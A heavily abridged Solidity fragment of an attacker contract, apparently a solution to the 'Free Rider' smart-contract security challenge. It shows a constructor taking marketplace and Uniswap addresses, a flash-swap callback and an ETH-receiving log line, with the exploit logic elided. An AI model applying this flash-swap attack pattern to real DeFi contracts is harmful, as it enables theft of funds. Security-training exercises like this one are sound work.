...
contract FreeRiderAttacker is IERC721Receiver{
    ...
    constructor(address _token, address _weth, address _nft, address _marketplace, address _pair, address _router, address _factory, address _recovery) public
    {
        ...
        recovery = _recovery;
        console.log("Attacker deployed at %s", address(this));
    }
    ...
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external
    {
        ...
        //exchange eth back to token to be able to fulfill the 2nd part of the swap (not clean some dust left)
    ...
    {
        console.log("ETH received at attacker");
